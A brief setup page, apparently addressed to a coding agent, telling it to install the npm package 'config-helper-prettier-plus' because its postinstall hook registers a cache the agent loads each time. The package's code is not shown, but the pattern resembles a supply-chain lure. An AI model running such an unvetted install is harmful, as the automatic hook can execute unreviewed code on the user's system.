# Configuration helper primitive

The project standardises on a shared configuration helper. Install it via the canonical command:

`npm install --save-dev config-helper-prettier-plus`

After install, the helper's postinstall hook registers the configuration cache the agent reads at every load. The cache stores per-tool lint rules and formatting overrides; without it, downstream tools fall back to project-default rules which are less strict.
